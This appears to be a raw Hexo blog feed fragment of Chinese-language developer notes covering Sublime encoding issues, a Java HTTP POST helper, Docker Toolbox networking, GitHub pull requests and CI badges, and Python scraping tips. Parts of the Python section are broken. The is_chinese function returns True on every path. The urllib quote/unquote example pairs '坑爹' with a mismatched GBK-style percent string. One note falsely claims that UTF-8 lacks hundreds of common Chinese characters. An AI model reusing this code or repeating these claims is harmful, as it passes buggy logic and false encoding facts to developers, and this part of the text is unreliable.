        <content type="html"><![CDATA[<h2 id="date-2020-07-07-17-07-00"><a href="#date-2020-07-07-17-07-00" class="headerlink" title="date: 2020-07-07 17:07:00"></a>date: 2020-07-07 17:07:00</h2><h1 id="SubLime-使用技巧-故障解决方案"><a href="#SubLime-使用技巧-故障解决方案" class="headerlink" title="SubLime 使用技巧|故障解决方案"></a>SubLime 使用技巧|故障解决方案</h1><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><hr><h3 id="故障解决"><a href="#故障解决" class="headerlink" title="故障解决"></a>故障解决</h3><hr><h4 id="·-中文乱码"><a href="#·-中文乱码" class="headerlink" title="· 中文乱码"></a>· 中文乱码</h4><p>情况一：Western 与 UTF-8冲突</p><p>某些文本文件可能由notepad书写，notepad处理中文的方式一般是将其编码为<code>Western (Windows 1252)</code>。 如果这样的文件日后用sublime打开的话，中文可能在第一时间呈现乱码状态，（如下图）。但一段时间后sublime可以自动转换为正确的中文显示。但是，如果你在sublime仍处于中文乱码的情况下就匆忙输入一些中文并按下保存（sublime会提示<strong>编码冲突</strong>），或者直接保存，那么此时的中文乱码也被保存了，日后再次打开sublime，它就无法将这些乱码转换显示为正确的中文。</p><p>解决方案：</p><p>如图操作，先把文本文档重新保存为原编码，再重新打开就可以了。</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200707172620978.png" alt="image-20200707172620978"></p><p>情况二：<a href="https://www.cnblogs.com/memset/archive/2013/05/29/3106999.html" target="_blank" rel="noopener">中文被编码成1个汉字4个字节</a></p>]]></content>
      
      
      <categories>
          
          <category> Sublime </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Code Library</title>
      <link href="/2020/06/09/Java-Code-Library/"/>
      <url>/2020/06/09/Java-Code-Library/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-code blink-slow"></i><em>convenient for code write</em></p><p><strong>Java http post 代码(传递数据，使用Body传递)</strong> </p><hr><p><em>作用：使用java发起post请求,附带data于请求的Body中（非kv参数）</em></p><p><em>实例：模拟curl功能，可以将某些依托curl完成的数据库数据插入指令转换为java实现</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">http_post</span><span class="params">(String url, String port, String path, String content)</span> </span>&#123;</span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@Description</span>: ingest a address and send the content to it.</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@Example</span> http://localhost:8428/write + content</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@param</span> url url address</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@param</span> port remote address port</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@param</span> path remote address path</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@param</span> content metric data</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       String result = <span class="string">""</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           url = url + <span class="string">":"</span> + port + <span class="string">"/"</span> + path;</span><br><span class="line">           System.out.println(url);</span><br><span class="line">           URL realUrl = <span class="keyword">new</span> URL(url);</span><br><span class="line">           URLConnection conn = realUrl.openConnection();</span><br><span class="line">           conn.setRequestProperty(<span class="string">"accept"</span>, <span class="string">"*/*"</span>);</span><br><span class="line">           conn.setRequestProperty(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">           conn.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">           conn.setDoInput(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// fill and send content</span></span><br><span class="line">           DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(conn.getOutputStream());</span><br><span class="line">           dos.write(content.getBytes());</span><br><span class="line">           dos.flush();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// get response (Do not comment this line, or the data insertion will be failed)</span></span><br><span class="line">           BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(conn.getInputStream()));</span><br><span class="line">           String line;</span><br><span class="line">           <span class="keyword">while</span> ((line = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">             result += line;</span><br><span class="line">           &#125;</span><br><span class="line">           System.out.println(result);<span class="comment">//</span></span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           System.out.println(<span class="string">"Exception,"</span> + e.getMessage());</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code library </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker ToolBox设置及内外网访问</title>
      <link href="/2020/05/21/Docker-ToolBox%E8%AE%BE%E7%BD%AE%E5%8F%8A%E5%86%85%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE/"/>
      <url>/2020/05/21/Docker-ToolBox%E8%AE%BE%E7%BD%AE%E5%8F%8A%E5%86%85%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-ToolBox设置及内外网访问"><a href="#Docker-ToolBox设置及内外网访问" class="headerlink" title="Docker ToolBox设置及内外网访问"></a>Docker ToolBox设置及内外网访问</h1><h3 id="环境版本"><a href="#环境版本" class="headerlink" title="环境版本"></a>环境版本</h3><hr><p>Docker-toolbox：<a href="https://github.com/docker/toolbox/releases/tag/v19.03.1" target="_blank" rel="noopener">v19.03.1</a></p><p>Boot2docker：<a href="https://github.com/boot2docker/boot2docker/releases/tag/v19.03.5" target="_blank" rel="noopener">v19.03.5</a></p><p>OS: Win 8.1</p><h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><hr><p>在windows系列中如果想要运行docker，除了win10之后，所有的系统都需要下载docker-toolbox来实现docker的正确安装与运行。docker-toolbox的安装暂且不提，比较简单。</p><p>有一点要注意，安装完成之后，点击<strong>Docker Quickstart Terminal</strong>来实现docker的启动，这时他会检查本地是否有正确的boot2docker.iso文件，这个文件在安装位置的DockerToolbox文件夹下是有一个默认的（但版本不是最新的），你也可以自己去<a href="https://github.com/docker/toolbox/releases/tag/v19.03.1" target="_blank" rel="noopener">这里</a>下载最新的版本，随后将下载好的iso文件丢到<code>C:\Users\yourusername\.docker\machine\cache</code>下，切记位置要正确，因为<code>.docker\machine\cache</code>这个路径在电脑上不止有一个，还有一个是在<code>C:\Users\yourusername\AppData</code>下，不要放错了位置。成功放好之后，检查成功，docker就可以正确启动了。</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200521163240217.png" alt="大鲸鱼"></p><h3 id="镜像修改问题"><a href="#镜像修改问题" class="headerlink" title="镜像修改问题"></a>镜像修改问题</h3><hr><p>安装之后，需要修改docker镜像源以解决pull的速度太慢的问题，以<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云镜像加速服务</a>为例</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200521163507216.png" alt="image-20200521163507216"></p><p>按照上图就可以解决源的问题，但一般在docker第一次启动时，default就已经被创建好了，所以你需要先↓</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine stop default</span><br><span class="line">$ docker-machine rm default</span><br></pre></td></tr></table></figure><p>把原先的机器删除之后，再按照阿里云的教程来做，不然会失败，提示default机器已存在。（当然你也可以不删除default，而是新建一个其他名字的机器也行）</p><h3 id="内外网访问问题"><a href="#内外网访问问题" class="headerlink" title="内外网访问问题"></a>内外网访问问题</h3><hr><p>docker-toolbox的原理是先生成一个由virtualbox模拟出的linux环境。在电脑中搜索点击virtualbox，打开之后就可以看到由toolbox生产的那个default机器</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200521164050280.png" alt="image-20200521164050280"></p><p>如果以上都没问题，那么你离访问你想要的容器只差最后几步。</p><p>首先你需要现在命令行里pull你想要的容器，这个过程应该很快，只要你正确配置了源</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200521164306797.png" alt="image-20200521164306797"></p><p>这里我以pull prometheus（开源时序数据库，端口为9090）为例，即以下面的命令运行prometheus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name prometheus -d -p 127.0.0.1:9090:9090 prom/prometheus</span><br></pre></td></tr></table></figure><p>这个时候你在自己的电脑上（宿主机）输入localhost:9090是访问不到容器的，这是因为目前docker容器所运行的环境不过是virtualbox的linux虚拟环境，此时就有两种方法可以让你成功访问到你想要的容器。</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>先选中default机器（目标机器，这里我演示的时候用的是default），点击左上角设置，找到网络部分的端口转发规则，按照如下图方式填写，（192.168.99.100是默认的IP地址，如果你不确定你的IP地址是不是这个，你可以从<strong>Docker Quickstart Terminal</strong>启动后出现的大鲸鱼下面内找到你的默认IP地址)。按照如下规则填写之后，就可以直接在宿主机输入localhost:9090访问到想要的容器。</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200521164717285.png" alt="image-20200521164717285"></p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>方法二过程没有那么麻烦，你不需要去配置网络，但是最后的访问可能比方法一要麻烦点。我们只需要将docker容器的启动命令修改为如下，（仍以prometheus启动为例）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### old : $ docker run --name prometheus -d -p 127.0.0.1:9090:9090 prom/prometheus</span></span><br><span class="line">$ docker run --name prometheus -d -p 9090:9090 prom/prometheus</span><br></pre></td></tr></table></figure><p>这个时候你就可以直接在宿主机的浏览器输入192.168.99.100:9090访问到你想要的容器内容。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub项目创建管理笔记</title>
      <link href="/2020/05/20/GitHub%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/05/20/GitHub%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="GitHub项目创建管理笔记"><a href="#GitHub项目创建管理笔记" class="headerlink" title="GitHub项目创建管理笔记"></a>GitHub项目创建管理笔记</h1><h3 id="pull-requests-与-merge"><a href="#pull-requests-与-merge" class="headerlink" title="pull requests 与 merge"></a>pull requests 与 merge</h3><hr><p>如果你想对他人的仓库代码有所贡献，首先你需要fork别人的仓库，随后将内容git clone到本地进行修改。以上过程推荐在Github Desktop的辅助下进行，（即使你命令行能力很强，desktop都有着很好的便捷性）</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520171045263.png" alt="image-20200520171045263"></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520171403086.png" alt="image-20200520171403086"></p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520171459828.png" alt="image-20200520171459828" style="zoom: 67%;" /><p>通过上面三张图所展示的步骤，就完成了准备阶段。此时你就可以在本地直接对项目进行修改，你所对此项目做出的增删改都会被github desktop记录，位置如下图：</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520172605812.png" alt="image-20200520172605812"></p><p>当你确认你所有的修改都是符合你的意图的之后就可以点击commit，输入summary，description （summary是你对这次代码修改内容的一个概括性标题，description是详细描述，这些都是为了方便代码原有者最快了解你的修改意图）</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520172953739.png" alt="image-20200520172953739"></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520173204934.png" alt="image-20200520173204934"></p><p>随后你就可以去浏览器上输入你刚刚fork之后生成的仓库地址，这时候就可以看到页面上有一个pull requests和compare，前者是把当前的改变提交给源仓库，后者是方便你再提交前再次确认一下你的改动内容。点击pull request之后，在跳转的页面再点击 create pull requests，之后整个过程就完成了。</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520173825422.png" alt="image-20200520173825422"></p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520173900005.png" alt="image-20200520173900005" style="zoom:50%;" /><p>当然，这部分只是你这里完成了。源仓库持有者会审核你的这次commit，在审核完毕后，会手动同意并merge，你的贡献就达到了。</p><p>但是要注意，目前很多大型开源项目在接受pull requests前会先使用自动化的代码检测工具对你的这次代码改动进行检测，内容大概是：针对你的代码是否可执行，格式是否规范等等，只有全部测试成功，源仓库持有者才会手动同意你的这次代码贡献。（所以一定要看清源仓库提交代码贡献前要满足的条件）</p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520174432113.png" alt="image-20200520174432113" style="zoom: 67%;" /><h3 id="Rich-the-Project-Index"><a href="#Rich-the-Project-Index" class="headerlink" title="Rich the Project Index"></a>Rich the Project Index</h3><hr><p>自己的项目仓库成功创建之后，就需要好好充实一下<code>README.md</code>，所以markdown的排版美感一定要掌握。同时一些认证的badge也可以让你的源项目看起来更正式，同时这些badge背后的工具也可以让你发现代码里的不足。</p><p>你可以在<a href="https://github.com/marketplace" target="_blank" rel="noopener">这里</a>explore你想要的工具。下面介绍些常用的工具和使用方法</p><h4 id="0-Create-your-own-badge"><a href="#0-Create-your-own-badge" class="headerlink" title="0.  Create your own badge"></a>0.  Create your own badge</h4><p>有一些badge是需要你自己创造的，比如你当前项目的语言依赖性，这个只有你自己比较清楚，所以这个时候就要去<a href="https://shields.io/" target="_blank" rel="noopener">shield.io</a>上自己生成svg文件，随后拿到markdown链接，放在<code>README.md</code>里。</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520201018369.png" alt="image-20200520201018369"></p><p>打开网页后找到此处，输入你想DIY的信息，例如我想声明该项目build with python3.5，那么就可以如下设置：</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520201043051.png" alt="image-20200520201043051"></p><p>之后再点击Make Badge,生成效果如图<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520201129814.png" alt="image-20200520201129814" style="zoom: 67%;" />。最后一步，复制地址栏中的url，复制到<code>README.md</code>里，done！（按理说url应该以.svg结尾，但是chrome最新版里我看不到svg字段，不知道是浏览器的原因还是它本身生成的url就不自带.svg后缀了，如果没有.svg，记得复制url后加上.svg，这样才可以正确显示)</p><h4 id="1-Travis-CI"><a href="#1-Travis-CI" class="headerlink" title="1. Travis-CI"></a>1. <a href="https://travis-ci.com/" target="_blank" rel="noopener">Travis-CI</a></h4><p>Travis CI 提供的是持续集成服务（Continuous Integration，简称 CI）。它绑定 Github 上面的项目，只要有新的代码，就会自动抓取。然后，提供一个运行环境，执行测试，完成构建，还能部署到服务器。</p><p>持续集成指的是只要代码有变更，就自动运行构建和测试，反馈运行结果。确保符合预期以后，再将新代码”集成”到主干。</p><p>持续集成的好处在于，每次代码的小幅变更，就能看到运行结果，从而不断累积小的变更，而不是在开发周期结束时，一下子合并一大块代码。</p><p>以<strong>Python</strong>项目为例，当你的项目创建仓库成功后，登入travis-ci，关联你github账号，随后你就在travis-ci可以浏览到自己github里的仓库列表，而此时任何CI-task都不会生效的，因为你还需要在你的项目中添加一个 <code>.travis.yml</code> 文件，其具体编写格式详见<a href="https://docs.travis-ci.com/user/languages/python/" target="_blank" rel="noopener">此处</a>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">python</span></span><br><span class="line"><span class="attr">python:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"2.7"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"3.4"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"3.5"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"3.6"</span>      <span class="comment"># current default Python on Travis CI</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"3.7"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"3.8"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"3.8-dev"</span>  <span class="comment"># 3.8 development branch</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"nightly"</span>  <span class="comment"># nightly build</span></span><br><span class="line"><span class="comment"># command to install dependencies</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">-r</span> <span class="string">requirements.txt</span></span><br><span class="line"><span class="comment"># command to run tests</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pytest</span></span><br></pre></td></tr></table></figure><p>以上面的模板为例，通过k:v的方式就能很直白的读懂这个模板yml文件，<code>language</code>指定当前项目语言，之后再根据当前项目的语言类型选择它所要进行测试的版本号，随后的<code>install</code>则是安装一些必须的库依赖。<code>script</code>则是你执行这个项目的命令代码。</p><h4 id="2-Codecov"><a href="#2-Codecov" class="headerlink" title="2. Codecov"></a>2. <a href="https://codecov.io/" target="_blank" rel="noopener">Codecov</a></h4><p>它是负责你集成测试你的代码覆盖率的工具，常常与CI与code coverage配合使用，大致流程就是使用code coverage类的测试工具生成report，由codecov命令找到你这个report显示到它那里。</p><p>以codecov与上面的travis-ci相配合为例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">python</span></span><br><span class="line"><span class="attr">python:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"3.5"</span></span><br><span class="line"><span class="comment"># command to install dependencies</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">-r</span> <span class="string">requirements.txt</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">coverage</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">codecov</span></span><br><span class="line"><span class="comment"># command to run tests</span></span><br><span class="line"><span class="attr">script:</span> <span class="string">python3</span> <span class="string">Main.py</span></span><br><span class="line"><span class="attr">after_success:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">coverage</span> <span class="string">run</span> <span class="string">Main.py</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">codecov</span></span><br></pre></td></tr></table></figure><p>注意这里的<code>after_success</code>，它的功能是在上面的<code>script</code>执行成功之后，才做出的一系列命令操作。可以看到首先用coverage run 执行我的主程序，这条命令结束之后，coverage report也就生成了，随后再使用codecov命令。通过上述操作，就可以codecov网站里找到对应的项目代码覆盖率信息报告，而此时你也可以在这个报告页面拿到你想要的badge。</p><h4 id="3-CodeFactor"><a href="#3-CodeFactor" class="headerlink" title="3. CodeFactor"></a>3. <a href="https://www.codefactor.io/" target="_blank" rel="noopener">CodeFactor</a></h4><p>代码结构分析，它会根据你的代码规范性来给出适当的评价。操作简单，无需多言，只要将它与github账户绑定，授权库的访问，就可以点击库列表中的某些库，分析出结果，随后拿到badge。</p><h4 id="4-To-be-continued……"><a href="#4-To-be-continued……" class="headerlink" title="4. To be continued……."></a>4. To be continued…….</h4><p>…………….</p>]]></content>
      
      
      <categories>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/05/13/hello-world/"/>
      <url>/2020/05/13/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="初来乍到"><a href="#初来乍到" class="headerlink" title="初来乍到"></a>初来乍到</h2><h4 id="如果你有幸看到这"><a href="#如果你有幸看到这" class="headerlink" title="如果你有幸看到这"></a>如果你有幸看到这</h4><p>Hello World。</p><p>整站主体语言是中文/英文。</p><p>整个博客涉及的内容不限，玩什么，尝试什么，就会写下来。</p><p>如果你在阅览后有建议或者发现错误，<a href="https://simonhu-hn.github.io/about/">请联系我</a>，多谢。</p><hr><p>本博客网站维护使用大致由下列工具与技术组成</p><p>├── Local<br>│   ├── <a href="https://www.typora.io/" target="_blank" rel="noopener">Typora</a> （撰写与维护文本内容）<br>│   ├── <a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">PicGo</a> （图床，图片内容）</p><p>├── Online<br>│   ├── <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>（白嫖服务器）<br>│   ├── <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> （博客系统，SSH deploy部署，Hexo-admin 偶尔管理）<br>│   ├── <a href="http://wzpan.github.io/hexo-theme-freemind-blog/" target="_blank" rel="noopener">hexo-theme-freemind</a> （原生主题）<br>│   ├── <a href="https://fontawesome.com" target="_blank" rel="noopener">FontAwesome</a>（图标库）<br>│   └── <a href="https://analytics.google.com/" target="_blank" rel="noopener">Google Analytics</a> </p><p>我的Brain提供主要技术支持。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python笔记与备忘录</title>
      <link href="/2020/05/11/Python_Note/"/>
      <url>/2020/05/11/Python_Note/</url>
      
        <content type="html"><![CDATA[<h1 id="Python笔记与备忘录"><a href="#Python笔记与备忘录" class="headerlink" title="Python笔记与备忘录"></a>Python笔记与备忘录</h1><p>本页面记录本人在编写python项目时遇到的所有陷阱和技巧 （update forever）</p><h2 id="爬虫篇"><a href="#爬虫篇" class="headerlink" title="爬虫篇"></a>爬虫篇</h2><hr><h3 id="坑、陷阱-Pitfall"><a href="#坑、陷阱-Pitfall" class="headerlink" title="坑、陷阱 / Pitfall"></a>坑、陷阱 / Pitfall</h3><ol><li><h4 id="headers构造空格"><a href="#headers构造空格" class="headerlink" title="headers构造空格"></a>headers构造空格</h4><p>从浏览器开发者工具复制下来的<a href="#headers构造">headers</a>一定要注意把空格消除。不然会被视为invalid headers.</p></li><li><h4 id="selector规则构造"><a href="#selector规则构造" class="headerlink" title="selector规则构造"></a>selector规则构造</h4><p>如果以同样的select rule 应用于所有页面，最后的结果却是部分数据缺失，99%的情况都是这些页面上要么没有你的rule中构造好的id or class，要么就是rule中的id和class所应用在的元素和其他页面不一样。</p></li><li><h4 id="nth-of-type与-nth-child"><a href="#nth-of-type与-nth-child" class="headerlink" title="nth-of-type与:nth-child"></a>nth-of-type与:nth-child</h4><p>nth-of-type被Beautifulsoup支持，后者不被支持</p></li><li><h4 id="select规则书写规范"><a href="#select规则书写规范" class="headerlink" title="select规则书写规范"></a>select规则书写规范</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">The combinator &#39;x&#39; at postion xx, must have a selector before it</span><br><span class="line">此错误不是任何时候都会报错，但是要注意书写规范，在select rule不要多空格或者其他乱七八糟的字符在</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#39;.mw-parser-output &gt; ul:nth-of-type(&#123;&#125;) &gt; li a&#39; #正确写法</span><br><span class="line">&#39;.mw-parser-output  &gt; ul:nth-of-type(&#123;&#125;) &gt; li a&#39; #多了一个空格报错</span><br></pre></td></tr></table></figure></li><li><h4 id="中文字符显示不全"><a href="#中文字符显示不全" class="headerlink" title="中文字符显示不全"></a>中文字符显示不全</h4><p>原因在于网页大都采用UTF-8字符集，该字符集缺字严重，连国务院2013年8月19日公布的8105个通用规范汉字（均为简体汉字）都不能全部显示出来，共缺249个汉字，复其中4个二级字，245个三级字。</p><p>一种可行的解决方法是：以维基百科为例，如果你爬取的是简体页面，那么你可以尝试寻找该页面是否有繁体中文版本，繁体字被爬取下来的时候是可以正常显示的</p></li><li><h4 id="Url中的"><a href="#Url中的" class="headerlink" title="Url中的#"></a>Url中的#</h4><p>在scrapy爬虫框架中会自动过滤掉#后面的内容，网络请求的时候“#”后面的参数会被忽略，解决方法<a href="#处理url中的sharp">T-4</a>。</p></li></ol><h3 id="技巧-Tech"><a href="#技巧-Tech" class="headerlink" title="技巧 / Tech"></a>技巧 / Tech</h3><hr><ol><li><h6 id="headers构造"><a href="#headers构造" class="headerlink" title="headers构造"></a>headers构造</h6><p>构造请求头（headers）时，可以直接从chrome的调试工具处复制真实的请求头</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520153948246.png" alt="image-20200520153948246"></p><p>然后此时还需要一点小微操就可以正确使用，以Pycharm为例，按Ctrl+R调出Regex匹配模式</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200520162051277.png" alt="image-20200520162051277"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">分别输入</span><br><span class="line">(.*?):(.*)</span><br><span class="line">&#39;$1&#39;:&#39;$2&#39;</span><br></pre></td></tr></table></figure><p>此时带有正确引号包裹的一个个headers键值对就构造好了。</p></li><li><h6 id="url中文处理"><a href="#url中文处理" class="headerlink" title="url中文处理"></a>url中文处理</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">urllib.parse.unquote</span><br><span class="line"><span class="comment"># 解码</span></span><br><span class="line">print(urllib.parse.unquote(<span class="string">'%B1%E0%C2%EB%BF%D3%B5%F9'</span>))</span><br><span class="line">坑爹</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line">urllib.parse.quote</span><br><span class="line">print(urllib.parse.quote(<span class="string">'坑爹'</span>))</span><br><span class="line"><span class="string">'%B1%E0%C2%EB%BF%D3%B5%F9'</span></span><br></pre></td></tr></table></figure></li><li><h6 id="判断字符串中是否有中文字符"><a href="#判断字符串中是否有中文字符" class="headerlink" title="判断字符串中是否有中文字符"></a>判断字符串中是否有中文字符</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_chinese</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    check whether the string includes the Chinese</span></span><br><span class="line"><span class="string">    param: string</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">u'\u4e00'</span> &lt;= ch &lt;= <span class="string">u'\u9fff'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure></li><li><h6 id="处理url中的sharp"><a href="#处理url中的sharp" class="headerlink" 